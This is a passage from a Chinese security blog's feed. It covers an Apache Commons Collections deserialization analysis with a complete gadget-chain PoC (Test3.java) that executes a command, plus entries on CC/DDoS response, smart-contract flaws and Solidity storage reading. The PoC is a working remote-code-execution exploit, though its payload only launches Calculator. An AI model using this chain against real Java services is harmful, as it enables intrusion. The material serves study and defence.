方法，所以我们只要想办法触发这个 toString 就可以调用成功</span></span><br><span class="line">    <span class="keyword">return</span> getKey() + <span class="string">&quot;=&quot;</span> + getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在目标变成了执行 <strong>TiedMapEntry</strong> 的 toString 方法。</p><p><strong>javax.management.BadAttributeValueExpException</strong> 代码片段：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Constructs a BadAttributeValueExpException using the specified Object to</span></span><br><span class="line"><span class="comment">* create the toString() value.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> val the inappropriate value.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BadAttributeValueExpException</span> <span class="params">(Object val)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.val = val == <span class="keyword">null</span> ? <span class="keyword">null</span> : val.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<span class="comment">// readObject 方法，绝了！</span></span><br><span class="line">    ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">    Object valObj = gf.get(<span class="string">&quot;val&quot;</span>, <span class="keyword">null</span>);<span class="comment">// valObj 等于输入流 val 对应的持久字段的值（我们可控）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (valObj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        val = <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (valObj <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">        val= valObj;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (System.getSecurityManager() == <span class="keyword">null</span><span class="comment">// 一般来说默认都不会设置系统的安全性，所以一定会进入这个分支</span></span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Long</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Integer</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Float</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Double</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Byte</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Short</span><br><span class="line">               || valObj <span class="keyword">instanceof</span> Boolean) &#123;</span><br><span class="line">        val = valObj.toString();<span class="comment">// 执行 toString 方法，反序列化漏洞利用成功</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// the serialized object is from a version without JDK-8019292 fix</span></span><br><span class="line">        val = System.identityHashCode(valObj) + <span class="string">&quot;@&quot;</span> + valObj.getClass().getName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>反射链已经满足条件，PoC 如下 Test3.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Test3.java</span></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);<span class="comment">// LazyMap 的 get 方法可以调用 transformerChain 对象 transform 方法</span></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);<span class="comment">// TiedMapEntry 的 toString 方法可以调用 lazyMap 对象的 get 方法</span></span><br><span class="line">        BadAttributeValueExpException ins = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);<span class="comment">// BadAttributeValueExpException 在反序列化时会调用 toString 方法</span></span><br><span class="line"></span><br><span class="line">        Field valfield = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            valfield = ins.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);<span class="comment">// 获取 ins 对象中 val 的 Field 对象</span></span><br><span class="line">            valfield.setAccessible(<span class="keyword">true</span>);<span class="comment">// 因为 val 是 private 变量，所以需要抑制 java 语法访问检查</span></span><br><span class="line">            valfield.set(ins, entry);<span class="comment">// 向 ins 对象的这个 Field 对象设置新值 entry</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream exp = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            oos = <span class="keyword">new</span> ObjectOutputStream(exp);</span><br><span class="line">            oos.writeObject(ins);<span class="comment">// 将 ins 对象序列化</span></span><br><span class="line">            oos.flush();</span><br><span class="line">            oos.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream out = <span class="keyword">new</span> ByteArrayInputStream(exp.toByteArray());</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois = <span class="keyword">new</span> ObjectInputStream(out);</span><br><span class="line">            Object obj = (Object) ois.readObject();<span class="comment">// 反序列化，命令执行！</span></span><br><span class="line">            ois.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3、踩坑记录"><a href="#3、踩坑记录" class="headerlink" title="3、踩坑记录"></a>3、踩坑记录</h3><p>使用 IDEA debug 跟踪分析时会有异常情况。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="http://p0desta.com/2019/03/30/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8Bjava%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%B3%BB%E5%88%97(%E4%B8%80)/">Apache Commons Collections反序列化漏洞分析</a> 主要学习文章</li><li><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1264803678201760">反射-调用方法 </a>基础原理</li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文以 Apache Commons Collections 反序列化为例来介绍该类型漏洞的原理。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;漏洞分析&quot;&gt;&lt;a href=&quot;#漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;漏洞分析&quot;&gt;&lt;/a&gt;漏洞分析&lt;/h2&gt;&lt;h3 id=&quot;1、漏洞复现环境&quot;&gt;&lt;a href=&quot;#1、漏洞复现环境&quot; class=&quot;headerlink&quot; title=&quot;1、漏洞复现环境&quot;&gt;&lt;/a&gt;1、漏洞复现环境&lt;/h3&gt;&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- jdk 8 / Apache Commons Collections 组件版本如下 --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;&amp;lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;commons-collections&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;commons-collections&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;3.2&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2、代码分析&quot;&gt;&lt;a href=&quot;#2、代码分析&quot; class=&quot;headerlink&quot; title=&quot;2、代码分析&quot;&gt;&lt;/a&gt;2、代码分析&lt;/h3&gt;&lt;p&gt;首先查看 &lt;strong&gt;org.apache.commons.collections.functors.InvokerTransformer&lt;/strong&gt; 代码片段：&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>DDoS 应急之 CC 攻击</title>
    <link href="http://example.com/1970/01/01/DDoS-contingency-measures-for-CC-attacks/"/>
    <id>http://example.com/1970/01/01/DDoS-contingency-measures-for-CC-attacks/</id>
    <published>1969-12-31T16:00:03.000Z</published>
    <updated>2021-04-28T12:17:10.647Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是-CC？"><a href="#什么是-CC？" class="headerlink" title="什么是 CC？"></a>什么是 CC？</h2><blockquote><p>Challenge Collapsar(CC)攻击是指经常向目标 Web 服务器发送标准的 HTTP 请求，其中的统一资源标识符(URI) 需要进行复杂的耗时算法或数据库操作，以消耗目标Web服务器的资源。<br>2004年，一位昵称为 KiKi 的中国黑客发明了一种黑客工具，用来发送这类请求，攻击名为 “Collapsar “的NSFOCUS 防火墙，因此这种黑客工具被称为 “Challenge Collapsar”，简称 CC。因此，这种攻击方式就有了 “CC攻击 “这个名字。</p></blockquote><h2 id="应急思路"><a href="#应急思路" class="headerlink" title="应急思路"></a>应急思路</h2><ul><li>如果是 CC 攻击导致拒绝服务，首先要定位问题，针对问题进行加固/扩容等动作。</li><li>对流量进行分析，根据下面的方案进行加固。</li></ul><h2 id="防御维度："><a href="#防御维度：" class="headerlink" title="防御维度："></a>防御维度：</h2><p>对于 CC 攻击，主要从以下三个维度考虑：</p><ol><li>第三方的 ip 评分系统(恶意服务器列表)</li><li>单个 ip 的访问速率</li><li>增强服务可用性</li></ol><p>按照架构进行防御加固，可以参考下列描述：</p><span id="more"></span><h3 id="CDN-层面防御"><a href="#CDN-层面防御" class="headerlink" title="CDN 层面防御"></a>CDN 层面防御</h3><p>设置相应的浏览器挑战(js challenge、captcha challenge)，并进行拦截。</p><h3 id="WAF-层面防御"><a href="#WAF-层面防御" class="headerlink" title="WAF 层面防御"></a>WAF 层面防御</h3><p>联动web应用日志动态封禁攻击者的 ip</p><h3 id="负载均衡层面防御"><a href="#负载均衡层面防御" class="headerlink" title="负载均衡层面防御"></a>负载均衡层面防御</h3><p>貌似只能扩容</p><h3 id="应用层面防御"><a href="#应用层面防御" class="headerlink" title="应用层面防御"></a>应用层面防御</h3><p>分析服务压力承受能力(重点关注公开接口)，对短板服务进行逻辑优化/扩容<br>检查服务中的配置（数据库连接池数量、缓存容量）</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">Denial-of-service attack</a> — Wikipedia</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;什么是-CC？&quot;&gt;&lt;a href=&quot;#什么是-CC？&quot; class=&quot;headerlink&quot; title=&quot;什么是 CC？&quot;&gt;&lt;/a&gt;什么是 CC？&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Challenge Collapsar(CC)攻击是指经常向目标 Web 服务器发送标准的 HTTP 请求，其中的统一资源标识符(URI) 需要进行复杂的耗时算法或数据库操作，以消耗目标Web服务器的资源。&lt;br&gt;2004年，一位昵称为 KiKi 的中国黑客发明了一种黑客工具，用来发送这类请求，攻击名为 “Collapsar “的NSFOCUS 防火墙，因此这种黑客工具被称为 “Challenge Collapsar”，简称 CC。因此，这种攻击方式就有了 “CC攻击 “这个名字。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;应急思路&quot;&gt;&lt;a href=&quot;#应急思路&quot; class=&quot;headerlink&quot; title=&quot;应急思路&quot;&gt;&lt;/a&gt;应急思路&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;如果是 CC 攻击导致拒绝服务，首先要定位问题，针对问题进行加固/扩容等动作。&lt;/li&gt;
&lt;li&gt;对流量进行分析，根据下面的方案进行加固。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;防御维度：&quot;&gt;&lt;a href=&quot;#防御维度：&quot; class=&quot;headerlink&quot; title=&quot;防御维度：&quot;&gt;&lt;/a&gt;防御维度：&lt;/h2&gt;&lt;p&gt;对于 CC 攻击，主要从以下三个维度考虑：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第三方的 ip 评分系统(恶意服务器列表)&lt;/li&gt;
&lt;li&gt;单个 ip 的访问速率&lt;/li&gt;
&lt;li&gt;增强服务可用性&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;按照架构进行防御加固，可以参考下列描述：&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>智能合约安全</title>
    <link href="http://example.com/1970/01/01/Smart-Contract-Security/"/>
    <id>http://example.com/1970/01/01/Smart-Contract-Security/</id>
    <published>1969-12-31T16:00:02.000Z</published>
    <updated>2021-04-28T12:17:30.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="常见安全问题"><a href="#常见安全问题" class="headerlink" title="常见安全问题"></a>常见安全问题</h2><h3 id="1、重入（Reentrancy）"><a href="#1、重入（Reentrancy）" class="headerlink" title="1、重入（Reentrancy）"></a>1、重入（Reentrancy）</h3><p>成因：智能合约信任被调用者，被调用者在执行被调用方法时进行递归调用，破坏智能合约业务逻辑。</p><p>防御建议：智能合约在调用外部智能合约时，优先变更自身参数，并在调用结束后验证。</p><h3 id="2、访问控制（Access-Control）"><a href="#2、访问控制（Access-Control）" class="headerlink" title="2、访问控制（Access Control）"></a>2、访问控制（Access Control）</h3><p>成因：参数、函数的访问控制出现问题，比如将一些关键参数设置为 public，可能在调用时被外部合约恶意变更，或是未对敏感函数设置访问控制，导致智能合约拥有者被改变。使用被废弃的 tx.origin 参数来校验调用者，在代理合约中随意使用 detegatecall 等都可能导致访问控制失效。</p><p>防御建议：正确的配置访问控制。</p><span id="more"></span><h3 id="3、算数问题（Arithmetic-Issues）"><a href="#3、算数问题（Arithmetic-Issues）" class="headerlink" title="3、算数问题（Arithmetic Issues）"></a>3、算数问题（Arithmetic Issues）</h3><p>成因：使用 Solidity 默认运算符时可能导致算数溢出。</p><p>防御建议：采用 openzeppelin 的 SafeMath 库。</p><h3 id="4、未检查低级调用返回值（Unchecked-Return-Values-For-Low-Level-Calls）"><a href="#4、未检查低级调用返回值（Unchecked-Return-Values-For-Low-Level-Calls）" class="headerlink" title="4、未检查低级调用返回值（Unchecked Return Values For Low Level Calls）"></a>4、未检查低级调用返回值（Unchecked Return Values For Low Level Calls）</h3><p>成因：未处理一些低级函数（call、callcode、delegatecall、send）的返回值。它们在执行出现错误的时候并不会 revert 之前的操作，只会返回一个运行失败的布尔值 false，合约代码会继续执行。如果不检查这种低级调用的返回值，可能会导致安全问题。</p><p>防御建议：使用低级调用的方式调用外部合约时一定要处理返回值</p><h3 id="5、拒绝服务（Denial-of-Service）"><a href="#5、拒绝服务（Denial-of-Service）" class="headerlink" title="5、拒绝服务（Denial of Service）"></a>5、拒绝服务（Denial of Service）</h3><p>成因：根据不同的智能合约可能存在不同的 DoS 方法，可能修改某些业务参数，调用合约时每次 require 检查都会被 revert ，从而导致整个合约停止服务。或者想办法让调用一次的 gas 超过以太坊规范导致 DoS 等。</p><p>防御建议：根据场景修复漏洞。</p><h3 id="6、不安全的随机算法（Bad-Randomness）"><a href="#6、不安全的随机算法（Bad-Randomness）" class="headerlink" title="6、不安全的随机算法（Bad Randomness）"></a>6、不安全的随机算法（Bad Randomness）</h3><p>成因：在区块链上没有绝对的随机算法，链上的一切随机数都会在一定程度上受到影响。</p><p>防御建议：不要依赖链上的随机算法。</p><h3 id="7、超前交易（Front-Running）"><a href="#7、超前交易（Front-Running）" class="headerlink" title="7、超前交易（Front-Running）"></a>7、超前交易（Front-Running）</h3><p>成因：交易上链前所有矿工都可以在交易池中看到这笔交易的信息，如果这笔交易有利可图，攻击者可以给出更高的小费，自己发布一笔同样的交易，这笔交易就会优先被矿工打包上链，从而抢先赚取这笔交易的利润，使原交易失败。</p><p>防御建议：根据场景防御。比如把合约设计为无法在一笔交易中获得利润，针对一个答题合约，要求用户先将答案用共钥加密再提交，然后再发起一笔交易提交私钥用来解密上一笔交易的答案。</p><h3 id="8、控制时间（Time-manipulation）"><a href="#8、控制时间（Time-manipulation）" class="headerlink" title="8、控制时间（Time manipulation）"></a>8、控制时间（Time manipulation）</h3><p>成因：block.timestamp 不可信，可以被矿工在一定程度上影响。</p><p>防御建议：不要依赖 block.timestamp 进行关键操作。</p><h3 id="9、短地址攻击（Short-Address-Attack）"><a href="#9、短地址攻击（Short-Address-Attack）" class="headerlink" title="9、短地址攻击（Short Address Attack）"></a>9、短地址攻击（Short Address Attack）</h3><p>成因：客户端未对输入数据进行检查，EVM 默认地址为 20 位，会补齐 12 个 0，当传入的是短地址时，12 个 0 不足以补齐 32 位，则会从第一个参数的高位取数进行补齐，导致参数变化。</p><p>防御建议：检查地址长度。</p><h3 id="10、闪电贷攻击（Flash-Loan-Attack）"><a href="#10、闪电贷攻击（Flash-Loan-Attack）" class="headerlink" title="10、闪电贷攻击（Flash Loan Attack）"></a>10、闪电贷攻击（Flash Loan Attack）</h3><h4 id="什么是闪电贷？"><a href="#什么是闪电贷？" class="headerlink" title="什么是闪电贷？"></a>什么是闪电贷？</h4><p>闪电贷是通过智能合约实现的一种贷款方式。智能合约允许用户在一笔交易中借出大量资金，只要在这笔交易结束前把钱和利息还回来即可。</p><p>成因：利用闪电贷功能对能被大量资金操纵价格的合约进行套利攻击。</p><p>防御：设计合约时要考虑大量资金操作的情况，因为闪电贷可以轻松让任何人瞬间拥有大量资金。</p><p>案例：<a href="https://www.chainnews.com/articles/277290599974.htm">全面揭露 bZx 闪电贷事件</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.dasp.co/">DASP Top10</a></li><li><a href="https://github.com/OpenZeppelin/openzeppelin-contracts">OpenZeppelin-contracts</a> OpenZeppelin 提供的标准库</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;常见安全问题&quot;&gt;&lt;a href=&quot;#常见安全问题&quot; class=&quot;headerlink&quot; title=&quot;常见安全问题&quot;&gt;&lt;/a&gt;常见安全问题&lt;/h2&gt;&lt;h3 id=&quot;1、重入（Reentrancy）&quot;&gt;&lt;a href=&quot;#1、重入（Reentrancy）&quot; class=&quot;headerlink&quot; title=&quot;1、重入（Reentrancy）&quot;&gt;&lt;/a&gt;1、重入（Reentrancy）&lt;/h3&gt;&lt;p&gt;成因：智能合约信任被调用者，被调用者在执行被调用方法时进行递归调用，破坏智能合约业务逻辑。&lt;/p&gt;
&lt;p&gt;防御建议：智能合约在调用外部智能合约时，优先变更自身参数，并在调用结束后验证。&lt;/p&gt;
&lt;h3 id=&quot;2、访问控制（Access-Control）&quot;&gt;&lt;a href=&quot;#2、访问控制（Access-Control）&quot; class=&quot;headerlink&quot; title=&quot;2、访问控制（Access Control）&quot;&gt;&lt;/a&gt;2、访问控制（Access Control）&lt;/h3&gt;&lt;p&gt;成因：参数、函数的访问控制出现问题，比如将一些关键参数设置为 public，可能在调用时被外部合约恶意变更，或是未对敏感函数设置访问控制，导致智能合约拥有者被改变。使用被废弃的 tx.origin 参数来校验调用者，在代理合约中随意使用 detegatecall 等都可能导致访问控制失效。&lt;/p&gt;
&lt;p&gt;防御建议：正确的配置访问控制。&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Solidity 进阶</title>
    <link href="http://example.com/1970/01/01/Solidity-Advanced/"/>
    <id>http://example.com/1970/01/01/Solidity-Advanced/</id>
    <published>1969-12-31T16:00:01.000Z</published>
    <updated>2021-04-28T12:17:35.609Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Stack-amp-Memory-amp-Storage"><a href="#Stack-amp-Memory-amp-Storage" class="headerlink" title="Stack &amp; Memory &amp; Storage"></a>Stack &amp; Memory &amp; Storage</h2><p>在 EVM 中，栈 (Stack) 用来执行操作，内存 (Memory) 与存储 (Storage) 用来存储变量。</p><p>Stack：以太坊代码在执行时会将数据 push 到栈中，通过各种操作码 (opcode) 来完成不同的指令，opcode 参数从栈顶依次向下取，如果 opcode 有返回参数则将返回参数 push 回栈顶。</p><p>Memory：用来存储临时变量的空间，一般每32字节存储一个变量，比如 mstore(p,v) 意味着 mem[p…(p + 32)) := v，即将 v 存储到 memory 的 p 至 p+32 的位置。</p><p>Storage：用来永久存储变量的空间，智能合约保存的所有数据，private 的变量也可以在 Storage 中查看。</p><p>数据在存储中的保存方式可以参考 <a href="https://docs.soliditylang.org/en/latest/abi-spec.html#types">solidity document</a> /<a href="https://solidity-cn.readthedocs.io/zh/develop/abi-spec.html#id4"> 中文版</a>。<br>我一般查看链上存储数据的方式是采用 web3.js 来读取数据。 代码如下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> web3 = <span class="keyword">new</span> Web3(Web3.givenProvider || <span class="string">&quot;wss://mainnet.infura.io/ws/v3/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;</span>);<span class="comment">// 在 infura 申请的 api</span></span></span><br><span class="line"><span class="javascript">web3.eth.getStorageAt(<span class="string">&quot;0x407d73d8a49eeb85d32cf465507dd71d507100c1&quot;</span>, <span class="number">0</span>).then(<span class="built_in">console</span>.log);<span class="comment">// 函数介绍：https://web3js.readthedocs.io/en/v1.3.0/web3-eth.html#getstorageat</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">Web3.js</span><br><span class="line">其实只需在 javascript 块中声明 web3 对象，然后在浏览器控制台使用 web3 函数就可以了。</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="create-contract-amp-call-contract"><a href="#create-contract-amp-call-contract" class="headerlink" title="create contract &amp; call contract"></a>create contract &amp; call 